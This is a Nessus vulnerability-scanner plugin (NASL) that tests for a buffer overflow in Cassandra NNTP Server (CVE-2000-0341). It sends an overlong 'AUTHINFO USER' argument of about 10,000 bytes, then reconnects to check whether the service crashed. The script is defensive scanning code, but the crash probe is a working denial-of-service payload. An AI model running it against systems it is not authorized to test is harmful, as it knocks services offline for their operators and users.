#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10388);
 script_bugtraq_id(1156);
 script_osvdb_id(1304);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-0341");
 script_name(english:"Cassandra NNTP Server Login Name Remote Overflow DoS");
 script_summary(english:"Crashes the remote NNTP server");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote NNTP server has a remote buffer overflow vulnerability."
 );
 script_set_attribute(attribute:"description", value:
"A vulnerable version of Cassandra NNTP Server appears to be running
on the remote host.  Providing a long argument to the 'AUTHINFO USER'
command results in a buffer overflow.  A remote attacker could use
this to create a denial of service, or possibly execute arbitrary code." );
 # https://web.archive.org/web/20080527035215/http://archives.neohapsis.com/archives/ntbugtraq/2000-q2/0072.html
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.nessus.org/u?26e24ed6"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of the software."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:C");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/05/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/05/01");
 script_cvs_date("$Date: 2016/11/15 13:39:08 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_family(english:"Denial of Service");
 
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");

 script_dependencie("find_service_3digits.nasl");
 script_require_ports("Services/nntp", 119);
 
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc:"nntp", default:119, exit_on_fail: 1);

soc = open_sock_tcp(port);
if (! soc) exit(1, "Cannot connect to TCP port "+port+".");

  r = recv(socket:soc, length:8192);
  if("posting allowed" >< r)
  {
    s = string("AUTHINFO USER ", crap(10002), "\r\n");
    send(socket:soc, data:s);
    close(soc);

    soc2 = open_sock_tcp(port);
    if (! soc2)
    {
      if (service_is_dead(port: port, exit:1) > 0)
        security_hole(port);
    }
    r2 = recv(socket:soc2, length:1024);
    if(!r2)
    {
      security_hole(port);
    }
    close(soc2);
  }

